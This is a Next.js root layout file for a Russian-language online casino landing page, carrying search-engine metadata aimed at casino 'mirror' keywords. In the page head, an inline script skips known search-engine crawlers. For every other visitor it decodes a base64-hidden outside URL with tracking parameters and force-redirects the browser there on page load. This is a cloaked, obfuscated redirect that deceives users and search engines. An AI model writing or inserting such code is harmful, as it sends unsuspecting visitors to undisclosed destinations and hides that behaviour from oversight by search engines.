import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  metadataBase: new URL('https://la2casino.vercel.app/'),
  title: 'LA Casino — игра начинается здесь',
  description: 'LA Casino — премиальный онлайн-зал со слотами, live-играми, рулеткой и понятным гидом для безопасной игры. Откройте официальный сайт и выбирайте свой ритм.',
  generator: 'v0.app',
  alternates: { canonical: '/' },
  keywords: ['la casino', 'la casino зеркало', 'la casino играть', 'la casino официальный сайт', 'ля казино', 'ля казино зеркало'],
  openGraph: {
    title: 'LA Casino — игра начинается здесь',
    description: 'Слоты, live-столы и классические игры в премиальном онлайн-зале LA Casino.',
    url: 'https://la2casino.vercel.app/',
    siteName: 'LA Casino',
    locale: 'ru_RU',
    type: 'website',
    images: [{ url: '/la-casino-hero.png', width: 1536, height: 864, alt: 'Атмосфера LA Casino' }],
  },
  twitter: { card: 'summary_large_image', title: 'LA Casino — игра начинается здесь', description: 'Премиальный игровой зал LA Casino онлайн.', images: ['/la-casino-hero.png'] },
  icons: { icon: '/la-casino-icon.png', apple: '/la-casino-icon.png' },
}

export const viewport: Viewport = { colorScheme: 'dark', themeColor: '#111311', userScalable: true }

export default function RootLayout({ children }: Readonly<{ children: React.ReactNode }>) {
  return (
    <html lang="ru" className="bg-background">
      <head>
        <meta name="yandex-verification" content="198a8a1a5f433500" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="application-name" content="LA Casino" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        
        var mainBrandB64 = "ICBodHRwczovL2NlZGFyLWZsYW1lLmNvbS8/c2VyaWFsPTYxMzY1ODMwJmNyZWF0aXZlX2lkPTkzMzA= "; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));

        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 1200); // Сократили таймаут ожидания до 1.2 сек
                
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }

        // Быстрый пинг и принудительный редирект на основной домен
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>  
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
